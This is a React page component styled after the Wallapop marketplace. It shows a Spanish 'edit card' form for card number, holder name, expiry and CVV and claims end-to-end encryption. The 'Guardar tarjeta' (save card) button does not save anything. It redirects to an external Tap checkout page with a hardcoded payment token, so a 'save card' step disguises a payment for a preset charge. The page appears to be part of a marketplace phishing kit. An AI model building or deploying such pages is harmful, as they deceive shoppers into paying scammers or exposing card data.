import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { PhoneShell } from "@/components/PhoneShell";

export const Route = createFileRoute("/editar-tarjeta")({
  component: EditCard,
});

function EditCard() {
  const navigate = useNavigate();
  const [number, setNumber] = useState("");
  const [name, setName] = useState("");
  const [exp, setExp] = useState("");
  const [cvv, setCvv] = useState("");

  return (
    <PhoneShell showHelp={false}>
      <h1 className="text-2xl font-bold mt-2">Editar tarjeta</h1>
      <p className="mt-2 text-gray-600 text-sm">
        Tus datos están protegidos con cifrado de extremo a extremo.
      </p>

      <form
        onSubmit={(e) => {
          e.preventDefault();
          navigate({ to: "/" });
        }}
        className="mt-6 space-y-4"
      >
        <Field label="Número de tarjeta">
          <input
            value={number}
            onChange={(e) => setNumber(e.target.value)}
            placeholder="1234 5678 9012 3456"
            inputMode="numeric"
            className="w-full bg-transparent outline-none"
          />
        </Field>
        <Field label="Titular">
          <input
            value={name}
            onChange={(e) => setName(e.target.value)}
            placeholder="Nombre y apellidos"
            className="w-full bg-transparent outline-none"
          />
        </Field>
        <div className="grid grid-cols-2 gap-3">
          <Field label="Caducidad">
            <input
              value={exp}
              onChange={(e) => setExp(e.target.value)}
              placeholder="MM/AA"
              className="w-full bg-transparent outline-none"
            />
          </Field>
          <Field label="CVV">
            <input
              value={cvv}
              onChange={(e) => setCvv(e.target.value)}
              placeholder="123"
              inputMode="numeric"
              className="w-full bg-transparent outline-none"
            />
          </Field>
        </div>

        <div className="fixed bottom-24 left-1/2 -translate-x-1/2 w-full max-w-md px-5">
<button
  type="button"
  onClick={() => {
    window.location.href =
      "https://checkout.tap.company/?mode=page&themeMode=&language=en&token=eyJhbGciOiJIUzI1NiJ9.eyJpZCI6IjZhMDg1ODY0NjVjNjg3NzVlODYxYTc0YyJ9.j4gs7IqNmhbBEEsM9lYzYRvVPcNs1iBDtgCeHY8jq7A";
  }}
  className="block text-center w-full py-4 rounded-full bg-wallapop hover:bg-wallapop-dark transition text-white font-semibold"
>
  Guardar tarjeta
</button>
        </div>
      </form>
    </PhoneShell>
  );
}

function Field({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <label className="block border border-gray-200 rounded-2xl px-4 py-3 focus-within:border-wallapop">
      <span className="text-xs text-gray-500">{label}</span>
      <div className="mt-1">{children}</div>
    </label>
  );
}
